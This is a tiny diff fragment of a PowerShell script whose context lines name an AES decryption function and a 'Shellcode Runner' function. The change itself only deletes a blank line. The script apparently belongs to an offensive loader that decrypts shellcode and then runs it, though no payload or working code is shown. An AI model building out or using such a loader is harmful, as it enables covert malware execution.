@@ -90,7 +90,6 @@ function DecryptBytesToBytes_Aes([byte[]] $EncryptedBufferWithIV, [byte[]] $AesK
     return $Decryptedms.ToArray()
 }
 
-
 ### Shellcode Runner
 function RunShellcode()
 {
